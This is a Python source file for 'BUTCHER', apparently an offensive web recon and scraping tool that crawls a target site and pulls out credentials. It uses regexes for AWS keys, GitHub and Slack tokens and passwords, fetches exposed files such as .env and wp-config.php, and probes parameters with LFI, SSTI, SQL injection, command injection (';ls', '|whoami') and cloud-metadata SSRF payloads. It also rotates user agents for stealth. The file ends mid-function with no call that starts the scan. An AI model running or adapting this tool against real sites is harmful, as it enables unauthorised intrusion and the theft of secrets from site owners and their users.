#!/usr/bin/env python3
"""
BUTCHER — Surgical Web Scraper
High-fidelity data extraction engine for the Hellhound ecosystem.
"""

import asyncio
import argparse
import sys
import os
import time
import json
import re
import csv
import random
import subprocess
import shutil
from datetime import datetime
from typing import List, Dict, Any, Optional, Set
from urllib.parse import urljoin, urlparse
import aiohttp
from bs4 import BeautifulSoup, Comment

# ── Colors & Branding ────────────────────────────────────────────────────────
class C:
    RED     = "\033[91m"          # Banner, CRITICAL, borders
    ORANGE  = "\033[38;5;214m"    # Labels, values, JS/assets
    BLUE    = "\033[94m"          # Section headers, VERIFIED tags
    CYAN    = "\033[96m"          # URLs in spider feed
    GREEN   = "\033[92m"          # Forms, POST endpoints, SUCCESS
    YELLOW  = "\033[93m"          # Filenames in intel
    WHITE   = "\033[97m"          # Content text
    GRAY    = "\033[90m"          # Dim metadata
    RST     = "\033[0m"           # Reset

def get_tw():
    try:
        tw = shutil.get_terminal_size().columns
        return tw if tw > 10 else 100
    except: return 100

BANNER = r"""
██████╗ ██╗   ██╗████████╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔══██╗██║   ██║╚══██╔══╝██╔════╝██║  ██║██╔════╝██╔══██╗
██████╔╝██║   ██║   ██║   ██║     ███████║█████╗  ██████╔╝
██╔══██╗██║   ██║   ██║   ██║     ██╔══██║██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝   ██║   ╚██████╗██║  ██║███████╗██║  ██║
╚═════╝  ╚═════╝    ╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
"""

def print_banner():
    tw = get_tw()
    print("")
    for line in BANNER.strip().split("\n"):
        print(f"{C.RED}{line.center(tw)}{C.RST}")
    print(f"{C.ORANGE}{'[ Created by L4ZZ3RJ0D — @l4zz3rj0d ]'.center(tw)}{C.RST}\n")

# ── HUD Engine ────────────────────────────────────────────────────────────────
class ButcherHUD:
    def __init__(self, target: str, args: Any):
        self.target = target
        self.args = args
        self.start_time = time.time()
        self.total_score = 0
        self.findings_count = 0
        self.categories = {}
        self.quiet = args.quiet
        self.silent = getattr(args, 'silent', False)

    def border(self):
        if self.quiet or self.silent: return
        print(f"    {C.RED}{'━' * (get_tw()-8)}{C.RST}")

    def header(self):
        if self.quiet or self.silent: return
        self.border()
        mode = "browser" if self.args.browser else "autonomous"
        print(f"\n      {C.BLUE}{'TARGET'.ljust(10)}{C.RST}: {C.ORANGE}{self.target}{C.RST}")
        print(f"      {C.BLUE}{'MODE'.ljust(10)}{C.RST}: {C.ORANGE}{mode}{C.RST}")
        print(f"      {C.BLUE}{'DEPTH'.ljust(10)}{C.RST}: {C.ORANGE}{self.args.depth}{C.RST}")
        print(f"      {C.BLUE}{'TIMEOUT'.ljust(10)}{C.RST}: {C.ORANGE}{self.args.timeout}s{C.RST}\n")
        self.border()

    def section(self, title: str):
        if self.quiet or self.silent: return
        print(f"\n    {C.BLUE}{title.upper()}{C.RST}\n")

    def add_finding(self, ftype: str, content: str, score: int):
        if self.silent: return
        if ftype not in self.categories:
            self.categories[ftype] = {"count": 0, "findings": []}
        self.categories[ftype]["count"] += 1
        self.categories[ftype]["findings"].append(content)
        self.total_score += score
        self.findings_count += 1

    def display_findings(self):
        if self.silent or not self.categories: return
        self.section("EXTRACTIONS")
        for ftype, data in self.categories.items():
            print(f"      {C.ORANGE}{ftype.upper()}{C.RST} ({C.WHITE}{data['count']}{C.RST})")
            for val in data["findings"]:
                clean_val = val.strip().replace("\n", " ")
                if len(clean_val) > 80: clean_val = clean_val[:77] + "..."
                print(f"        {C.WHITE}{clean_val}{C.RST}")

    def loot(self, type_label: str, content: str, url: str, note: str = ""):
        print(f"      {C.WHITE}{type_label}{C.RST}")
        if note: print(f"        {C.BLUE}{note}{C.RST}")
        # Display ALL content, not truncated
        for line in content.splitlines()[:50]:
            line = line.strip()
            if line:
                print(f"        {C.WHITE}{line}{C.RST}")
        print(f"        {C.ORANGE}URL: {url}{C.RST}\n")

    def footer(self, findings: int, score: int, duration: float):
        self.section("SUMMARY")
        print(f"      {C.BLUE}{'Findings'.ljust(15)}{C.RST}: {C.ORANGE}{findings}{C.RST}")
        sev = "CRITICAL" if score >= 80 else "HIGH" if score >= 50 else "MEDIUM"
        print(f"      {C.BLUE}{'Risk Score'.ljust(15)}{C.RST}: {C.RED}{score} ({sev}){C.RST}")
        print(f"      {C.BLUE}{'Time'.ljust(15)}{C.RST}: {C.WHITE}{duration:.1f}s{C.RST}")
        print(f"      {C.BLUE}{'Output'.ljust(15)}{C.RST}: {C.ORANGE}butcher_{self.target.replace('http://','').replace('https://','').replace('/','_')}.json{C.RST}\n")
        self.border()
        print(f"      {C.BLUE}✓ Done.{C.RST}\n")

    def summary(self, filename: str):
        if self.silent: return
        elapsed = time.time() - self.start_time
        self.footer(self.findings_count, self.total_score, elapsed)

# ── Screenshot Manager ───────────────────────────────────────────────────────
class ScreenshotManager:
    def __init__(self, output_dir: str = "./screenshots"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
    
    async def take_screenshot(self, url: str, vuln_type: str, page) -> Optional[str]:
        """Take screenshot of current browser page"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            domain = urlparse(url).netloc.replace('.', '_')
            filename = f"{domain}_{vuln_type}_{timestamp}.png"
            filepath = os.path.join(self.output_dir, filename)
            await page.goto(url, wait_until="networkidle")
            await page.screenshot(path=filepath, full_page=True)
            return filepath
        except Exception as e:
            return None

# ── Extraction Matrix ─────────────────────────────────────────────────────────
class ExtractionMatrix:
    PATTERNS = {
        "emails": {"regex": r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+', "score": 1, "label": "EMAIL"},
        "ips": {"regex": r'\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b', "score": 20, "label": "INTERNAL_IP"},
        "aws_key": {"regex": r'(?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}', "score": 100, "label": "AWS_KEY"},
        "google_api": {"regex": r'AIza[0-9A-Za-z\\-_]{35}', "score": 50, "label": "GOOGLE_API"},
        "github_token": {"regex": r'ghp_[a-zA-Z0-9]{36}', "score": 80, "label": "GITHUB_TOKEN"},
        "slack_token": {"regex": r'xox[baprs]-[0-9a-zA-Z]{10,48}', "score": 70, "label": "SLACK_TOKEN"},
        "credentials": {"regex": r'\b(?i)(?:password|passwd|pass|db_password|db_user|api_key|secret_key|token|auth_token)\b\s*[:=]\s*["\']?([a-zA-Z0-9!@#$%^&*()_+]{4,64})["\']?', "score": 100, "label": "CREDENTIAL"},
        "sensitive_files": {"regex": r'\b(?:\.env|wp-config\.php|config\.php|settings\.py|database\.yml|\.git/config|backup\.sql|dump\.sql|debug\.log|secret[^\s]*)\b', "score": 40, "label": "SENSITIVE_FILE"}
    }

    @staticmethod
    def extract_from_text(text: str, filters: Set[str]) -> List[Dict[str, Any]]:
        findings = []
        for key, meta in ExtractionMatrix.PATTERNS.items():
            if filters and key not in filters and meta['label'].lower() not in filters:
                continue
            matches = re.findall(meta['regex'], text)
            for match in set(matches):
                findings.append({"type": meta['label'], "content": match, "score": meta['score']})
        return findings

    @staticmethod
    def extract_from_soup(soup: BeautifulSoup, filters: Set[str]) -> List[Dict[str, Any]]:
        findings = []
        if not filters or "hidden" in filters:
            for inp in soup.find_all("input", type="hidden"):
                findings.append({"type": "HIDDEN_INPUT", "content": f"{inp.get('name', 'N/A')}={inp.get('value', 'N/A')}", "score": 5})
        if not filters or "comments" in filters:
            for comment in soup.find_all(string=lambda text: isinstance(text, Comment)):
                if any(k in comment.upper() for k in ["TODO", "FIXME", "DEBUG", "HACK", "XXX", "SECRET"]):
                    findings.append({"type": "SENSITIVE_COMMENT", "content": comment.strip(), "score": 10})
        if not filters or "js_vars" in filters:
            for script in soup.find_all("script"):
                if script.string:
                    matches = re.findall(r'(?:var|const|let)\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*=\s*[\'"]([^\'"]+)[\'"]', script.string)
                    for var_name, var_val in matches:
                        if any(k in var_name.upper() for k in ["KEY", "SECRET", "TOKEN", "PASS", "AUTH", "API"]):
                            findings.append({"type": "JS_VAR", "content": f"{var_name}={var_val}", "score": 30})
        if not filters or "json_ld" in filters:
            for script in soup.find_all("script", type="application/ld+json"):
                if script.string:
                    findings.append({"type": "JSON_LD", "content": script.string.strip()[:200] + "...", "score": 5})
        return findings

# ── Stealth & Evasion ─────────────────────────────────────────────────────────
class StealthManager:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    ]
    @staticmethod
    def get_random_ua(): return random.choice(StealthManager.USER_AGENTS)

# ── Universal Helpers ─────────────────────────────────────────────────────────
def get_traversal_depth(url: str) -> str:
    """Universal traversal depth calculator based on URL path"""
    parsed = urlparse(url)
    depth = len(parsed.path.strip('/').split('/')) + 1
    return "../" * max(depth, 3)

def is_file_url(url: str) -> bool:
    """Detect if URL points to a file (not a web page)"""
    parsed = urlparse(url)
    path = parsed.path.lower().rstrip('/')
    if not path or path == '/': return False
    
    # Common web page extensions to exclude
    page_exts = ['.html', '.htm', '.php', '.asp', '.aspx', '.jsp', '.xhtml']
    ext = os.path.splitext(path)[1]
    
    # If it has an extension and it's not a web page, it's a file
    if ext and ext not in page_exts: return True
    
    # Sensitive or common file names without extensions
    sensitive = ['secret', 'flag', 'password', 'config', 'backup', 'debug', 'admin', '.env', '.git', 'robots', 'sitemap', 'creds']
    if any(s in path for s in sensitive): return True
    
    # If no extension, treat as potential file (e.g. /config)
    if not ext: return True
    
    return False

def is_meaningful_content(content: str) -> bool:
    """Check if response content is real data, not HTML boilerplate"""
    text = content.strip()
    if len(text) < 10: return False
    lower = text[:500].lower()
    # Reject HTML pages (boilerplate)
    if lower.startswith('<!doctype') or lower.startswith('<html'): return False
    return True

def extract_clean_text(html: str) -> str:
    """Extract rendered text (stripping noise) while preserving readability"""
    try:
        if not html: return ""
        soup = BeautifulSoup(html, 'html.parser')
        # Remove noise
        for tag in soup(['script', 'style', 'nav', 'header', 'footer', 'aside', 'iframe', 'button']):
            tag.decompose()
        
        # Get text with line breaks preserved
        lines = (line.strip() for line in soup.get_text().splitlines())
        chunks = (phrase.strip() for line in lines for phrase in line.split("  "))
        text = '\n'.join(chunk for chunk in chunks if chunk)
        return text
    except:
        return html.strip()[:1000]

def is_interesting_content(text: str) -> bool:
    """Heuristic check for interesting data in clean text"""
    if not text: return False
    keywords = ["password", "secret", "key", "token", "auth", "flag{", "admin", "login", "creds", "database", "config"]
    text_lower = text.lower()
    return any(k in text_lower for k in keywords)

# ── Recon Engine ──────────────────────────────────────────────────────────────
async def run_external_spider(target: str, depth: int, browser: bool, hud: ButcherHUD):
    _script_dir = os.path.dirname(os.path.abspath(__file__))
    spider_paths = [os.path.join(_script_dir, "spider.py"), os.path.join(os.path.dirname(_script_dir), "Hellhound-Spider", "spider.py")]
    spider_path = next((p for p in spider_paths if os.path.exists(p)), None)
    if not spider_path: return [{"url": target, "method": "GET"}]

    cmd = [sys.executable, spider_path, target, "-d", str(depth), "--verbose"]
    if not browser:
        cmd.append("--no-playwright")

    hud.section("DISCOVERY")

    env = os.environ.copy()
    env["PYTHONUNBUFFERED"] = "1"
    env["TERM"] = "xterm-256color"

    proc = await asyncio.create_subprocess_exec(
        *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, env=env
    )

    # Spider color constants (match spider.py exactly)
    S_G  = "\033[92m"   # green  — found/discovered
    S_Y  = "\033[93m"   # yellow — JS files
    S_CY = "\033[96m"   # cyan   — crawl fetches
    S_R  = "\033[91m"   # red    — warnings/auth-wall
    S_W  = "\033[97m"   # white  — URLs
    S_GR = "\033[90m"   # gray   — dots
    S_RST = "\033[0m"

    discovered_urls = []
    discovered_methods = {}
    seen_urls = set()

    while True:
        line = await proc.stdout.readline()
        if not line: break
        decoded = line.decode().strip()
        if not decoded: continue

        # Strip ANSI for clean parsing
        clean = re.sub(r'\033\[[0-9;]*m', '', decoded).strip()
        if not clean: continue

        # Filter out spider metadata/branding
        skip = ["█", "▓", "▒", "░", "━", "Created by", "HELLHOUND", "Concurrency",
                "0/0", "Coverage", "Confidence", ".butcher_recon", "Crawling:"]
        if any(x in clean for x in skip): continue
        if clean.startswith("Target") or clean.startswith("[*]") or clean.startswith("started"): continue
        if clean.startswith("GET ") and any(x in clean for x in ["HIGH", "MEDIUM", "LOW"]): continue

        # Extract URL for dedup
        url_match = re.search(r'(https?://[^\s\]\)]+)', clean)
        if not url_match: continue
        url = url_match.group(1)

        # Deduplicate
        if url in seen_urls: continue
        seen_urls.add(url)

        # Detect method
        method = "POST" if ("[Form]" in clean or "POST" in clean) else "GET"

        # ── Spider-native color scheme ──
        if "[!]" in clean or "Auth-wall" in clean:
            # Warning line (red)
            print(f"      {S_R}[!]{S_RST} {S_Y}{clean.split(']',1)[-1].strip()}{S_RST}")
        elif "[Form]" in clean or "POST" in clean:
            # Form discovery (green with marker)
            print(f"      {S_G}[~]{S_RST} {S_W}{clean}{S_RST}")
        elif url.endswith(".js") or "[ JS ]" in clean:
            # JS file (yellow)
            print(f"      {S_Y}JS{S_RST}  {S_W}{url}{S_RST}")
        elif "Crawl" in clean:
            # Crawl fetch (cyan)
            print(f"      {S_CY}↓{S_RST}  {S_W}{url}{S_RST}")
        else:
            # Standard discovery (green arrow + white URL)
            print(f"      {S_G}↳{S_RST}  {S_W}{url}{S_RST}")

        discovered_urls.append(url)
        discovered_methods[url] = method

    await proc.wait()

    if discovered_urls:
        return [{"url": u, "method": discovered_methods.get(u, "GET")} for u in discovered_urls]
    return [{"url": target, "method": "GET"}]

# ── Scraper Core ──────────────────────────────────────────────────────────────
class ButcherEngine:
    def __init__(self, args):
        self.args = args
        self.findings = []
        self.filters = set(args.extract.split(",")) if args.extract else set()
        self.endpoint_metadata = {}
        self.endpoints_list = []

    async def run(self, hud: ButcherHUD, page=None):
        endpoints = await run_external_spider(self.args.target, self.args.depth, self.args.browser, hud)
        self.endpoints_list = endpoints
        total_eps = len(endpoints)
        screenshot_mgr = ScreenshotManager(self.args.screenshot_dir) if self.args.screenshot else None

        async with aiohttp.ClientSession(headers={"User-Agent": StealthManager.get_random_ua()}) as session:
            for i, ep in enumerate(endpoints[:self.args.max_pages]):
                url = ep["url"]
                if any(ex in url for ex in self.args.exclude.split(",")): continue
                print(f"      {C.ORANGE}[→]{C.RST} Scrapping: {C.WHITE}{url}{C.RST}")
                self.findings.append({"type": "SURFACE", "content": url, "score": 10, "url": url})
                try:
                    async with session.get(url, timeout=self.args.timeout) as resp:
                        html = await resp.text()
                        
                        # 1. Pattern-based extraction (regex)
                        results = self.perform_extraction(html)
                        screenshot_taken = False
                        for res in results:
                            res["url"] = url
                            hud.add_finding(res["type"], res["content"], res["score"])
                            self.findings.append(res)
                            
                            # Take screenshot of sensitive finding if not already taken for this page
                            if screenshot_mgr and page and not screenshot_taken:
                                ss_path = await screenshot_mgr.take_screenshot(url, "discovery", page)
                                if ss_path:
                                    print(f"      📸 Screenshot: {C.CYAN}{ss_path}{C.RST}")
                                    res["screenshot"] = ss_path
                                    screenshot_taken = True
                        
                        # 2. HEURISTIC CONTENT EXTRACTION (Not missing single endpoint)
                        clean = extract_clean_text(html)
                        if (is_file_url(url) or is_interesting_content(clean)) and is_meaningful_content(html):
                            filename = urlparse(url).path.split('/')[-1] or url
                            # Display if not already shown via regex
                            if not any(res["content"] in clean for res in results):
                                hud.loot(filename, clean[:self.args.max_content_display], url, f"{C.CYAN}[INTELLIGENCE EXTRACTION]{C.RST}")
                                self.findings.append({"type": "INTERESTING_CONTENT", "content": filename, "score": 30, "url": url})
                                
                                # Take screenshot for interesting content
                                if screenshot_mgr and page and not screenshot_taken:
                                    ss_path = await screenshot_mgr.take_screenshot(url, "sensitive_content", page)
                                    if ss_path:
                                        print(f"      📸 Screenshot: {C.CYAN}{ss_path}{C.RST}")
                                        screenshot_taken = True

                        self.endpoint_metadata[url] = {"status": resp.status, "size": len(html)}
                except: pass
        hud.display_findings()

    def perform_extraction(self, html: str) -> List[Dict[str, Any]]:
        soup = BeautifulSoup(html, "html.parser")
        text = soup.get_text()
        return ExtractionMatrix.extract_from_text(text, self.filters) + ExtractionMatrix.extract_from_soup(soup, self.filters)

class TargetIntelligenceEngine:
    def __init__(self, endpoints: List[Dict[str, Any]], args: Any):
        self.endpoints = endpoints
        self.args = args
        self.chains = []
        self.tested = set()
        self.successful_files = set()
        self.blocked_files = set()
        self.screenshot_mgr = ScreenshotManager(args.screenshot_dir) if args.screenshot else None

    async def run_full_scan(self, hud: ButcherHUD, page=None):
        """Universal intelligence scan on ALL discovered endpoints"""
        file_urls = [ep for ep in self.endpoints if is_file_url(ep['url'])]
        param_urls = [ep for ep in self.endpoints if '?' in ep['url']]
        other_urls = [ep for ep in self.endpoints if ep not in file_urls and ep not in param_urls]

        print(f"      {C.BLUE}[INTEL]{C.RST} {C.WHITE}Found {len(file_urls)} file URLs, {len(param_urls)} parameterized endpoints, {len(other_urls)} surface pages{C.RST}")
        
        timeout = aiohttp.ClientTimeout(total=5, connect=3)
        async with aiohttp.ClientSession(headers={'User-Agent': StealthManager.get_random_ua()}, timeout=timeout) as session:
            # Phase 1: Universal Surface Audit (Scrap EVERYTHING)
            hud.section("SURFACE AUDIT")
            for ep in self.endpoints:
                url = ep['url']
                if url in self.tested: continue
                self.tested.add(url)
                print(f"      {C.CYAN}[→]{C.RST} Auditing: {C.WHITE}{url}{C.RST}")
                try:
                    async with session.get(url) as resp:
                        content = await resp.text()
                        # Run patterns on everything found
                        results = ExtractionMatrix.extract_from_text(content, set()) + \
                                  ExtractionMatrix.extract_from_soup(BeautifulSoup(content, 'html.parser'), set())
                        
                        screenshot_taken = False
                        for res in results:
                            res["url"] = url
                            hud.add_finding(res["type"], res["content"], res["score"])
                            if self.args.screenshot and page and not screenshot_taken:
                                ss = await self.screenshot_mgr.take_screenshot(url, "surface_leak", page)
                                if ss: print(f"      📸 Screenshot: {C.CYAN}{ss}{C.RST}"); screenshot_taken = True
                except: pass

            # Phase 2: Direct access to files
            if file_urls:
                hud.section("DIRECT ACCESS SCAN")
                for ep in file_urls:
                    url = ep['url']
                    # Re-verify direct access if not already handled
                    await self._test_direct_access(session, url, hud, page)

            # Phase 3: LFI Probing
            if param_urls:
                hud.section("LFI PROBE")
                # Audit ALL discovered files (blocked or not) across all parameters
                targets = list(set(list(self.successful_files) + list(self.blocked_files)))
                for ep in param_urls:
                    url = ep['url']
                    parsed = urlparse(url)
                    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    params = [p.split('=')[0] for p in parsed.query.split('&') if '=' in p]
                    
                    for param in params:
                        for target_file in targets:
                            key = f"{base_url}:{param}:{target_file}"
                            if key in self.tested: continue
                            self.tested.add(key)
                            if target_file not in self.successful_files:
                                await self._test_lfi(session, base_url, param, target_file, hud, page)



    def _is_raw_file(self, filename: str) -> bool:
        """Check if filename is a raw/text file (not a web page)"""
        raw_exts = ['.txt', '.log', '.conf', '.ini', '.cfg', '.yml', '.yaml',
                    '.json', '.xml', '.csv', '.sql', '.bak', '.old', '.env']
        return any(filename.lower().endswith(ext) for ext in raw_exts)

    def _format_content(self, content: str, filename: str) -> str:
        """Format content based on file extension for display"""
        ext = filename.split('.')[-1].lower() if '.' in filename else ''
        if ext == 'json':
            try:
                return json.dumps(json.loads(content), indent=2)
            except: pass
        if ext in ['html', 'htm'] or '<html' in content.lower():
            return extract_clean_text(content)
        return content.strip()

    async def _test_direct_access(self, session, url: str, hud: ButcherHUD, page=None):
        """Test direct access to a file URL"""
        filename = urlparse(url).path.split('/')[-1] or url
        print(f"      {C.CYAN}[→]{C.RST} Testing: {C.WHITE}{filename}{C.RST}")
        try:
            async with session.get(url) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    print(f"      {C.GREEN}[✓] ACCESSIBLE{C.RST}")
                    # Clean content based on extension
                    clean = self._format_content(content, filename)
                    hud.loot(filename, clean[:self.args.max_content_display], url, f"{C.GREEN}[VERIFIED]{C.RST}")
                    
                    finding = {"type": "EXPOSED_FILE", "file": filename, "url": url}
                    if self.args.screenshot and page and ('<html' in content.lower() or not self._is_raw_file(filename)):
                        ss_path = await self.screenshot_mgr.take_screenshot(url, "direct", page)
                        if ss_path:
                            print(f"      📸 Screenshot: {C.CYAN}{ss_path}{C.RST}")
                            finding["screenshot"] = ss_path

                    self.chains.append(finding)
                    hud.add_finding("EXPOSED_FILE", filename, 100)
                    self.successful_files.add(filename)
                    return True
                elif resp.status in [403, 404]:
                    print(f"      {C.ORANGE}[{resp.status}] Blocked{C.RST}")
                    self.blocked_files.add(filename)
        except Exception as e:
            if self.args.verbose: print(f"      {C.RED}[Error]{C.RST} {e}")
        return False

    async def _test_lfi(self, session, base_url: str, param: str, target_file: str, hud: ButcherHUD, page=None):
        """Test LFI with minimal strategies"""
        display_name = target_file.split('/')[-1] or target_file
        page_name = base_url.split('/')[-1] or base_url
        payloads = [display_name]
        if not target_file.startswith('/'): payloads.append(f"../{display_name}")

        for payload in payloads:
            poc_url = f"{base_url}?{param}={payload}"
            print(f"      {C.CYAN}[→]{C.RST} LFI: {C.WHITE}{page_name}?{param}={payload}{C.RST}")
            try:
                async with session.get(poc_url) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        print(f"      {C.GREEN}[✓] SUCCESS!{C.RST}")
                        clean = self._format_content(content, display_name)
                        hud.loot(display_name, clean[:self.args.max_content_display], poc_url, f"{C.GREEN}[VERIFIED] LFI via {param}{C.RST}")
                        
                        finding = {"type": "LFI", "param": param, "file": target_file, "url": poc_url}
                        if self.args.screenshot and page:
                            ss_path = await self.screenshot_mgr.take_screenshot(poc_url, "lfi", page)
                            if ss_path:
                                print(f"      📸 Screenshot: {C.CYAN}{ss_path}{C.RST}")
                                finding["screenshot"] = ss_path

                        self.chains.append(finding)
                        hud.add_finding("LFI", f"{param} → {target_file}", 100)
                        self.successful_files.add(target_file)
                        return True
            except: continue
        return False

# ── Surgical Validation Engine ────────────────────────────────────────────────
class SurgicalValidationEngine:
    def __init__(self, session: aiohttp.ClientSession, chains: List[Dict[str, Any]], args: Any):
        self.session = session
        self.chains = chains
        self.args = args
        self.proofs = []

    async def validate(self):
        vuln_types = self.args.vuln_types.split(",") if self.args.vuln_types != "all" else ["lfi", "sqli", "xss", "ssrf", "redirect", "cmdi", "ssti", "idor"]
        for chain in self.chains:
            c_type = chain.get("type", "").lower()
            if c_type not in vuln_types: continue
            if c_type == "ssti": await self._validate_ssti(chain)
            elif c_type in ["sqli", "cmdi", "ssrf"]: await self._validate_surface(chain)
            elif c_type == "redirect": await self._validate_redirect(chain)
        return self.proofs

    async def _validate_ssti(self, chain: Dict[str, Any]):
        try:
            url = chain.get("url", "")
            param = chain.get("param", "")
            if not url or not param: return
            payload = "{{7*7}}"
            poc_url = url.replace(f"{param}=", f"{param}={payload}")
            async with self.session.get(poc_url, timeout=10) as resp:
                text = await resp.text()
                if "49" in text:
                    self.proofs.append({"type": "SSTI", "url": poc_url, "evidence": "{{7*7}} evaluated to 49", "payload": payload, "severity": "CRITICAL"})
        except: pass

    async def _validate_surface(self, chain: Dict[str, Any]):
        try:
            url = chain.get("url", "")
            param = chain.get("param", "")
            c_type = chain.get("type", "")
            if not url or not param: return
            probes = {
                "sqli": ["'\"", "1' OR '1'='1"],
                "cmdi": [";ls", "|whoami"],
                "ssrf": ["http://127.0.0.1:80", "http://169.254.169.254/"]
            }
            indicators = {
                "sqli": ["sql syntax", "mysql", "sqlite", "postgresql", "ora-"],
                "cmdi": ["root:", "bin/", "usr/"],
                "ssrf": ["metadata", "latest/", "ami-id"]
            }
            for probe in probes.get(c_type.lower(), []):
                poc_url = url.replace(f"{param}=", f"{param}={probe}")
                async with self.session.get(poc_url, timeout=10) as resp:
                    text = await resp.text()
                    if any(x in text.lower() for x in indicators.get(c_type.lower(), [])):
                        self.proofs.append({"type": c_type.upper(), "url": poc_url, "evidence": "Sensitive data reflected", "payload": probe, "severity": "CRITICAL"})
                        break
        except: pass

    async def _validate_redirect(self, chain: Dict[str, Any]):
        try:
            url = chain.get("url", "")
            param = chain.get("param", "")
            if not url or not param: return
            poc_url = url.replace(f"{param}=", f"{param}=https://google.com")
            async with self.session.get(poc_url, timeout=10, allow_redirects=False) as resp:
                loc = resp.headers.get("Location", "")
                if "google.com" in loc:
                    self.proofs.append({"type": "OPEN_REDIRECT", "url": poc_url, "evidence": f"Redirected to {loc}", "severity": "HIGH"})
        except: pass

# ── CLI ───────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="Butcher Surgical Discovery Engine")
    parser.add_argument("target", nargs="?", help="Target URL or domain")
    parser.add_argument("--test", action="store_true", help="Run against test target")
    parser.add_argument("-b", "--browser", action="store_true", help="Use browser (Playwright) for discovery")
    parser.add_argument("-e", "--extract", default="", help="Filter extraction (e.g. emails,ips)")
    parser.add_argument("-o", "--output", help="Output file")
    parser.add_argument("-O", "--output-format", choices=["json", "csv", "markdown"], default="json")
    parser.add_argument("-d", "--depth", type=int, default=3, help="Crawl depth")
    parser.add_argument("-m", "--max-pages", type=int, default=200, help="Max pages to scrape")
    parser.add_argument("-n", "--min-findings", type=int, help="Stop after N findings")
    parser.add_argument("-T", "--max-time", type=int, default=600, help="Max execution time (sec)")
    parser.add_argument("-w", "--timeout", type=int, default=15, help="Request timeout (sec)")
    parser.add_argument("-x", "--exclude", default="logout,delete", help="Exclude paths")
    parser.add_argument("-f", "--follow-redirects", action="store_true", help="Follow redirects")
    parser.add_argument("-s", "--stealth", action="store_true", help="Enable stealth mode")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-D", "--debug", action="store_true", help="Debug mode")
    parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode")
    parser.add_argument("-S", "--silent", action="store_true", help="Silent mode")
    parser.add_argument("-i", "--intel", action="store_true", help="Enable Target Intelligence Engine")
    parser.add_argument("-sc", "--screenshot", action="store_true", help="Take screenshots of confirmed vulnerabilities")
    parser.add_argument("--screenshot-dir", default="./screenshots", help="Directory for screenshots")
    parser.add_argument("-I", "--intel-output", help="Save relationship graph as JSON")
    parser.add_argument("-V", "--intel-verbose", action="store_true", help="Show detailed attack chains")
    parser.add_argument("--vuln-type", "--vuln-types", dest="vuln_types", default="all", help="Comma-separated vuln types")
    parser.add_argument("--aggressive", action="store_true", help="Enable aggressive surface probing")
    parser.add_argument("--show-content", action="store_true", default=True, help="Display extracted content")
    parser.add_argument("--max-content-display", type=int, default=5000, help="Max content display length")
    parser.add_argument("--vuln-auto-verify", action="store_true", default=True, help="Auto-verify vulnerabilities")
    parser.add_argument("--no-banner", action="store_true", help="Suppress banner")
    args = parser.parse_args()

    if args.test: args.target = "http://testphp.vulnweb.com"
    if not args.target:
        parser.print_help()
        sys.exit(0)
    if not args.target.startswith("http"): args.target = "http://" + args.target
    if not args.output:
        domain = urlparse(args.target).netloc.replace(".", "_")
        args.output = f"butcher_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

    if not args.no_banner: print_banner()
    if args.silent: sys.exit(0)

    hud = ButcherHUD(args.target, args)
    hud.header()

    async def run_scan():
        start_time = time.time()
        
        # Browser setup (Shared)
        browser, context, page = None, None, None
        if args.screenshot:
            try:
                from playwright.async_api import async_playwright
                playwright = await async_playwright().start()
                browser = await playwright.chromium.launch(headless=True)
                context = await browser.new_context(user_agent=StealthManager.get_random_ua())
                page = await context.new_page()
            except Exception as e:
                print(f"      {C.RED}[!] Global Browser failed: {e}{C.RST}")
                args.screenshot = False

        engine = ButcherEngine(args)
        await engine.run(hud, page)

        # Intelligence Engine — universal scan on ALL discovered endpoints
        if args.intel:
            hud.border()
            intel = TargetIntelligenceEngine(engine.endpoints_list, args)
            await intel.run_full_scan(hud, page)

            # Display attack chains
            if intel.chains:
                hud.border()
                hud.section("ATTACK CHAINS")
                print(f"      {C.RED}[INTEL] Built {len(intel.chains)} verified chains:{C.RST}\n")
                for chain in intel.chains:
                    ctype = chain.get('type', 'UNKNOWN')
                    cfile = chain.get('file', '')
                    curl  = chain.get('url', '')
                    if ctype == 'DIRECT':
                        print(f"        {C.GREEN}✓{C.RST} {C.RED}Direct Exposure → {cfile} (CRITICAL){C.RST}")
                    elif ctype == 'LFI':
                        param = chain.get('param', '?')
                        print(f"        {C.GREEN}✓{C.RST} {C.RED}LFI via {param} → {cfile} (CRITICAL){C.RST}")
                    else:
                        print(f"        {C.GREEN}✓{C.RST} {C.RED}{ctype} → {cfile} (CRITICAL){C.RST}")

                # Surgical Validation on parameterized chains
                if args.vuln_auto_verify:
                    param_chains = [c for c in intel.chains if c.get('param')]
                    if param_chains:
                        async with aiohttp.ClientSession() as session:
                            validator = SurgicalValidationEngine(session, param_chains, args)
                            proofs = await validator.validate()
                            if proofs:
                                hud.section("VALIDATION PROOFS")
                                for proof in proofs:
                                    print(f"        {C.RED}● {proof['type']}{C.RST} {C.WHITE}{proof.get('evidence','')}{C.RST}")
                                    print(f"          {C.ORANGE}{proof['url']}{C.RST}")

